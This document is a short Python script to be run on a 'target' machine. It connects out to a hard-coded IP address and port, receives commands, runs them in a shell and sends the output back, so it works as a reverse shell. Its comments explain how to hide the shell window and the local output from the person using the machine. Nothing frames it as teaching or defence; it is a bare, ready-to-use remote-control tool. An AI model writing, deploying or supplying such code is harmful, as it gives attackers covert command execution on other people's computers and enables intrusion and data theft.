# Run this file on the target computer/server
import os
import socket
import subprocess
import time

s = socket.socket()
host = "192.168.1.6" # enter the ip of the computer/server
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        # If you want to hidse the shell window from end-point client change shell to False
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str) # optional, comment out to hide the output, this will output the results of commands to the terminal of the end-point client/user

# Close connection
s.close()
